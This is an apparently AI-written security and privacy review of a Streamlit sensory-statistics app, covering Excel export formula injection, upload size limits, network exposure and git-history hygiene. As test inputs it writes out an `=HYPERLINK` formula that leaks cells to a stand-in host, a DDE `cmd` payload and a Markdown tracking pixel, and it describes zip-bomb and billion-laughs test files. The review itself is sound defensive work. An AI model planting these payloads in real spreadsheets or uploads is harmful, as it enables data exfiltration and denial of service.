# B07 Security, privacy and data handling

Reviewer: B07 (security, privacy, data handling). Commit reviewed: `bcaf9f8`. Read-only; all scratch work in `.../scratchpad/agents/B07/`.

## Scope and method

Checked: every `st.file_uploader` site and the loaders in `core/data.py`; disk writes (tempfile, kaleido, matplotlib); XML/zip parsing of untrusted `.xlsx`; formula injection in Excel exports (driven end to end through the real RATA workflow); every statsmodels/patsy formula construction; `eval`/`exec`/`pickle`/`.query`/`.eval`; `st.html` / `unsafe_allow_*` / `st.markdown` with user strings; Streamlit cache keying across sessions; logging; network behaviour of Streamlit and kaleido; full git history (403 commits, `git log --all -p`, all paths ever added, emails, home paths, deleted binaries); tracked `.claude/` content.

Commands and scripts (all in the scratch dir):
- `formula_injection.py`: AppTest drive of RATA on sensochoc with products renamed to `=1+1`, `@SUM(2,2)`, `+3+3`, `-4+4`, `=HYPERLINK("http://example.invalid/?leak="&A2,"Click")` and attributes renamed to `=2*21`, `=cmd|' /C calc'!A0`; then `utils.export.generate_excel_report` and an openpyxl scan for `cell.data_type == 'f'`.
- `zipbomb.py` + `parse.py`: 0.30 MB `.xlsx` whose sheet XML is 86 MB, parsed through the unwrapped `core.data.load_data` under `ulimit -v 6 GB`.
- `laughs.py`: billion-laughs DTD inside `sheet1.xml`, parsed with `pd.read_excel`.
- `streamlit run app.py --server.port 8597` for 25 s, then `ss -ltn` and the startup log.
- kaleido export via `utils.plot_theme.export_figure(fig, 'word', 'png'|'svg')`, inspecting child processes and `/tmp`.
- `git log --all -p` (18 MB) grepped for key/token patterns, emails, home paths, `data/` file names; `git log --all --name-only` for every path ever committed.

## Findings

### SEC-01: Excel exports write any text beginning with "=" as a live formula (formula injection)
- Severity: HIGH
- Confidence: VERIFIED
- Location: `utils/export.py`, every builder (`generate_excel_report` l.829ff, `generate_da_excel_report` l.631, `generate_liking_excel_report` l.1028 incl. `Demographics` and `Raw_Data`, `generate_fusion_excel_report` l.1664 `Raw_Data`, `generate_prefmap_excel_report`, `generate_cata_excel_report`); root cause is `DataFrame.to_excel(engine='openpyxl')`, which stores any `str` starting with `=` as a formula cell.
- Evidence: `formula_injection.py` (RATA run completes with no exception). Formula cells found per sheet: Results_Table 4, Descriptives_CLD 40, Means_Wide 4, TickingRate_Wide 4, TickingRatePerRep_Wide 4, LMM_ANOVA 2, PostHoc_Pairwise 170, CochransQ 2, Raw_Data 2320. Examples: `Results_Table!E1 = '=HYPERLINK("http://example.invalid/?leak="&A2,"Click")'`, `Means_Wide!C1 = "=cmd|' /C calc'!A0"`, `Descriptives_CLD!B2 = '=2*21'`. Values beginning `@`, `+`, `-` were written as plain strings (openpyxl only treats `=` as a formula), so the xlsx risk is confined to `=`. Output saved as `rata_evil_export.xlsx`.
- Impact: product codes, attribute names, consumer IDs and especially free-text demographic answers (Liking demographics file, respondent-typed) are copied verbatim into the workbook. A respondent or a third-party questionnaire export can plant `=HYPERLINK(...)`/`=WEBSERVICE(...)` that sends neighbouring cells (other panellists' data) to an external URL when the analyst opens and clicks or recalculates, or DDE-style payloads on older Excel. Even benign data with a leading `=` (e.g. a product labelled `=A`) turns into a broken formula, so the export shows errors instead of the label. Excel's Protected View reduces but does not remove the risk once the analyst enables editing.
- Recommendation: add a final sweep next to `_format_p_value_cells` (it already visits every cell of every sheet as the last act of every builder) that, for every cell with `data_type == 'f'`, restores it as a string (`cell.value = str(v); cell.data_type = 's'`) or prefixes `'`. The app never writes a genuine formula, so the sweep can be unconditional. Pin it with a test using a `=` product name, as above.
- Effort: S
- Dependencies: none

### SEC-02: No upload size cap and no decompression guard; a 0.3 MB workbook costs 46 s and 475 MB
- Severity: HIGH (hosted multi-user); LOW (local single-user)
- Confidence: VERIFIED (measurement); SUSPECTED (effect on other sessions)
- Location: `.streamlit/config.toml` (no `server.maxUploadSize`, so Streamlit's default 200 MB applies; `streamlit.config.get_option('server.maxUploadSize')` returns 200); `core/data.py:8-37` `load_data` and `:41-100` `load_precomputed_means` call `pd.read_excel` / `pd.read_csv` without any size, row or column limit.
- Evidence: `zipbomb.py` produced `compressed 0.30 MB, sheet xml uncompressed 86.0 MB, ratio 290:1`; `parse.py` returned `shape (1000000, 5) 45.9s peak RSS MB 475`. Extrapolating linearly (not run, to spare the shared machine): a 3 MB upload is about 8 minutes and 4.5 GB; the 200 MB cap is far past any server's memory. The resulting frame is also stored in `st.cache_data(max_entries=4)`, so the memory stays held after the session ends.
- Impact: on a shared deployment one upload (malicious or simply a huge export from survey software) can exhaust server memory and kill the process for every user. openpyxl parsing is pure Python and holds the GIL, so other sessions are likely stalled for the duration (SUSPECTED; confirm by timing a second AppTest session during the parse). Locally it only hurts the uploader.
- Recommendation: set `server.maxUploadSize` to a realistic value (sensory files are rarely above 10 to 20 MB); before `read_excel`, open the upload with `zipfile` and reject when the summed `file_size` of `xl/worksheets/*.xml` exceeds a threshold or the ratio is extreme; cap rows/columns after parsing with a clear message.
- Effort: S
- Dependencies: D-B07-1 (deployment)

### SEC-03: Local install listens on every network interface and phones checkip.amazonaws.com at start
- Severity: MEDIUM
- Confidence: VERIFIED
- Location: `.streamlit/config.toml` (`server.headless = true`, no `server.address`); Streamlit `web/bootstrap.py:297-325`, `net_util.py:24-55`.
- Evidence: `streamlit run app.py --server.port 8597` then `ss -ltn` shows `LISTEN 0 2048 *:8597`; the log prints `Network URL: http://10.2.0.2:8597` and `External URL: http://144.48.38.183:8597`. The external URL comes from `net_util.get_external_ip()`, an HTTP GET to `http://checkip.amazonaws.com` (HTTPS fallback), executed because `server.headless` is true and `server.address` is unset.
- Impact: a scientist running FreeSense on a laptop on office, university or conference Wi-Fi exposes the app to anyone on that network. Other visitors get their own session (they cannot read the owner's `session_state`), but they can use the server, and the app offers no authentication. The outbound call discloses the user's IP to AWS on every start, which contradicts the README-level impression that nothing leaves the machine (`browser.gatherUsageStats = false` is set, but this is a separate call).
- Recommendation: for the local-install distribution set `[server] address = "localhost"` in `.streamlit/config.toml` (this also takes the single-URL branch and skips the external-IP lookup). A hosted deployment overrides it in its own config.
- Effort: S
- Dependencies: D-B07-1

### SEC-04: Third-party proprietary files are in the git history (XLSTAT tutorial workbook with macros, training slides, a PDF)
- Severity: HIGH (if the GitHub repository is or will become public); presence VERIFIED, licensing status SUSPECTED
- Confidence: VERIFIED (files and metadata); SUSPECTED (that redistribution is not permitted)
- Location: git history only, none in the current tree. `example_data/LIK_tuto_EN.xlsm` (added `acf8ffa` 2026-03-27, removed `01065d1` 2026-04-23); `PLS.pptx` (added `fd50b56`, removed later); `docs/PLS.pdf` (added `1a6d701`, 1.7 MB); also `Rplots.pdf`, `validation/PrefMap/_out/carto_reference.pdf`, `notebooks/pls_validation.ipynb`.
- Evidence: `git show acf8ffa:example_data/LIK_tuto_EN.xlsm` : `docProps/core.xml` creator "Fabien Llobell", 26 worksheets named `XLSTAT_20220318_...`, contains `xl/vbaProject.bin` (92 KB VBA macros). `PLS.pptx` slide text: "XLSTAT PLS set up ... XLSTAT Recommends ...", creator "Gemma", created 2017. `docs/PLS.pdf` provenance not established (no readable metadata). History is pushed to `origin` (`https://github.com/Sesnor-y/FreeSense.git`); repo visibility could not be checked (`gh` not installed).
- Impact: anyone cloning a public repo can recover these files with `git show`. Redistributing a vendor tutorial workbook and third-party training slides is plausibly outside their licence; the xlsm also ships macros in a scientific repo's history.
- Recommendation: confirm provenance and permission for each; if not clearly redistributable, rewrite history (`git filter-repo --path ... --invert-paths`) before the repository is made public or released, and force-push with notice to any clones. Decide together with the home-path and data-file-name cleanup in SEC-08 so history is rewritten once.
- Effort: S (rewrite) to M (coordination)
- Dependencies: D-B07-3; overlaps B08 (licensing)

### SEC-05: No privacy or data-handling statement; personal data is held in shared server memory with no expiry
- Severity: MEDIUM (local); HIGH if hosted for third parties
- Confidence: VERIFIED
- Location: `README.md` and the About overlay (grep for privacy, personal data, GDPR, confidential: no hits in `README.md`, `CLAUDE.md`, `docs/*.md`); `core/data.py` and `stats/*` `@st.cache_data(max_entries=4|8)` with no `ttl`; export builders write `Raw_Data` (consumer/assessor IDs) and Liking `Demographics`.
- Evidence: Streamlit hashes an `UploadedFile` by its full bytes (`streamlit/runtime/caching/hashing.py:646-652`), so one session cannot receive another's cached result without already holding identical inputs: no cross-user leak via cache keys. But cache entries are process-global, have no TTL, and persist after the session closes until evicted by newer entries or restart. Nothing is written to disk by the app (orientation section 3; kaleido run added no files under `/tmp`).
- Impact: panellist IDs, consumer demographics and liking scores are personal data under the Australian Privacy Act and GDPR when they can identify someone. Locally, data never leaves the machine (apart from SEC-03), which is a selling point the app does not state. Hosted, the operator holds these data in RAM for an unbounded time, anyone with server access (logs, memory dumps) can reach them, and users are told nothing.
- Recommendation: add a short "Your data" section to the About page and README: where processing happens, that nothing is stored on disk, that data live only in server memory for the session plus cache, that exports contain raw IDs, and advise pseudonymised IDs. For a hosted build add `ttl=` (e.g. 1 hour) to every `cache_data` and consider `st.cache_data.clear()` on session end.
- Effort: S
- Dependencies: D-B07-1, D-B07-2

### SEC-06: Full Python tracebacks are shown to end users
- Severity: LOW
- Confidence: VERIFIED
- Location: `.streamlit/config.toml` (no `[client] showErrorDetails`; `get_option('client.showErrorDetails')` returns `full`).
- Evidence: config query above. Uncaught exceptions render the traceback with absolute server paths in the browser.
- Impact: harmless locally; on a hosted server it discloses file paths and library versions.
- Recommendation: set `showErrorDetails = "type"` (or `"none"`) in the hosted configuration.
- Effort: S
- Dependencies: D-B07-1

### SEC-07: Uploaded column names are interpolated into st.markdown
- Severity: LOW
- Confidence: SUSPECTED (not rendered in a browser here)
- Location: `modules/cata/ui.py:778`, `modules/rata/ui.py:244`, `modules/descriptive/workflow.py:299`, `modules/liking/workflow.py:1218` and `:2156`.
- Evidence: f-strings put raw column names/demographic variable names inside `st.markdown`. HTML is escaped (no `unsafe_allow_html` anywhere, confirmed by grep), so no script execution; but Markdown syntax is honoured, so a column named `![x](https://host/pixel)` would make the browser fetch that URL.
- Impact: tracking pixel or misleading link from a crafted file; negligible for a self-uploaded file.
- Recommendation: wrap user strings in backticks or use `st.text`/`st.caption` with escaping (a small `_md_escape` helper).
- Effort: S
- Dependencies: none

### SEC-08: Repository history hygiene: home paths, private dataset names, dangling tracked symlink
- Severity: LOW
- Confidence: VERIFIED
- Location: git history; `.claude/skills/developing-with-streamlit` (tracked, mode 120000).
- Evidence: 130 lines with `/var/home/Lukas/...` or `/home/Lukas/...` in `git log --all -p`, all in deleted Markdown/planning files (confirms orientation). Deleted docs name private `data/` files: `DA_EPMF.xlsx`, `DA_Raw_Data.xlsx`, `Basic_liking_red.xlsx`, `Consumer_complexity_RATA-and-Liking.xlsx`, `rata_example.xlsx`, `cata_example.xlsx` (names only; no data rows from `data/` were found and no `data/` path was ever committed). Commit emails are GitHub noreply, `noreply@anthropic.com`, or placeholder `you@example.com` (14 commits); no personal email. The tracked `.claude/skills/developing-with-streamlit` is a symlink to `../../env/lib/python3.14/site-packages/streamlit/.agents/skills/...`, dangling in any fresh clone. `.claude/settings.local.json` (9.8 KB) was never committed, but it is ignored only by the owner's global git ignore (`~/.config/git/ignore:1`), not by the repo's `.gitignore`.
- Impact: low; reveals a username and a possible client/project code ("EPMF"). A collaborator without the global ignore could commit `settings.local.json`.
- Recommendation: add `.claude/settings.local.json` to `.gitignore`; decide whether `.claude/` ships at all (D-B07-3); fold path/name scrubbing into the SEC-04 history rewrite if one happens.
- Effort: S
- Dependencies: SEC-04

## Checked, nothing material found

- **Formula/code evaluation:** every patsy formula is a constant string over internally created columns (`Prod_Safe`, `Assessor_Safe`, `_product`, `_demo`, `_p`, `_r`): `stats/da_anova.py:224,292,317,522,525`, `stats/mixed_models.py:60-66`, `stats/liking.py:235-243,321,1155`, `stats/panel_performance.py:212,743`. User values reach patsy only as data levels via `.astype(str)`, which are never evaluated. No user column name is ever placed in a formula, so no `Q()` quoting is needed.
- No `eval`, `exec`, `pickle`, `joblib`, `yaml.load`, `DataFrame.query/.eval`, `subprocess` or `os.system` in `app.py`, `core/`, `stats/`, `modules/`, `utils/` (one `__import__('scipy.stats')` version probe at `modules/descriptive/workflow.py:1015`, constant).
- `st.html` sites: two, both static (`app.py:45` scroll script, `utils/ui_shell.py:386` swatches from a fixed palette). No `unsafe_allow_html`, no `components.v1`.
- **XML attacks:** billion-laughs inside `sheet1.xml` is rejected by expat 2.8.3 (`ParseError limit on input amplification factor`, 0.25 s). defusedxml is not installed and openpyxl does not use lxml; expat does not resolve external entities. External links in xlsx are not fetched (pandas reads cached values).
- File-type checking: `type=` is set on every uploader (`utils/ui_shell.py:847` wrapper, `modules/cata/ui.py:614`). This is extension-only, but `pd.read_excel` sniffs content, so a renamed file fails to parse with a user-facing error rather than being mis-parsed.
- **Disk writes:** none by the app. kaleido runs as a subprocess with cwd in its package directory; no new files appeared in `/tmp` after PNG and SVG exports. MathJax is loaded from the vendored `file://` path, not a CDN. matplotlib (`utils/plotting.py:2894`) renders off-screen only (it may create the standard `~/.cache/matplotlib` font cache).
- **Secrets:** none. No AWS/GitHub/OpenAI/Anthropic/Slack key patterns or private-key blocks in `git log --all -p`; "token/secret/password" hits are all prose ("quadrant token", `.gitignore` comment).
- **Logging:** `logging.WARNING` to stderr; messages include attribute names and exception text, never data rows or IDs.
- **Streamlit security defaults:** `server.enableXsrfProtection = True`, `enableCORS = True`, `developmentMode = False`, `browser.gatherUsageStats = false`.
- **Cache isolation:** content-hashed keys (see SEC-05); no `st.cache_resource` holds user data.

## Decisions raised

- **D-B07-1 Deployment model.** Local install only, or also a hosted instance (Streamlit Community Cloud, institutional server)? SEC-02, -03, -05, -06 change severity with this. Hosted also needs authentication, which Streamlit does not provide by itself.
- **D-B07-2 Privacy obligations.** If hosted, the operator becomes an entity handling personal information (Australian Privacy Act 1988 / APPs if an APP entity; GDPR if EU panellists or users; Streamlit Community Cloud hosts in the US, which raises cross-border transfer questions). Whether a privacy notice, a data-processing statement or a "local use only" position is needed is a legal judgement, not concluded here. Locally, a one-paragraph "data never leaves your computer" statement is low-cost and true once SEC-03 is fixed.
- **D-B07-3 Repository publication and history.** Is the GitHub repository public, or will it be at release? If yes, decide on rewriting history to remove the XLSTAT workbook, slides and PDF (SEC-04) and the home paths / private file names (SEC-08), and whether `.claude/agents/` should ship.
- **D-B07-4 Raw data in exports.** Every workbook includes `Raw_Data` with panellist/consumer IDs (and Liking demographics). Keep as default, make it opt-in, or offer pseudonymisation?

## Leads for other areas

- `.xls` is accepted by RATA, DA and CATA uploaders but `xlrd` is not installed (`ModuleNotFoundError: No module named 'xlrd'`), so every `.xls` upload fails (B03/B06).
- `core/data.py:18` checks `uploaded_file.name.endswith('.csv')` case-sensitively: `DATA.CSV` is routed to `read_excel` and fails (B03).
- `core/data.py:83` `load_precomputed_means` reads CSV without `encoding='utf-8-sig'`, unlike `load_data`; a BOM would corrupt the first header (B03).
- kaleido launches Chromium with `--no-sandbox --allow-file-access-from-files` (plotly/kaleido defaults); fine locally, worth noting for a hardened hosted build (B06).
- Whether Streamlit's built-in `st.dataframe` CSV download escapes leading `=` was not verified (B07 follow-up if hosted).
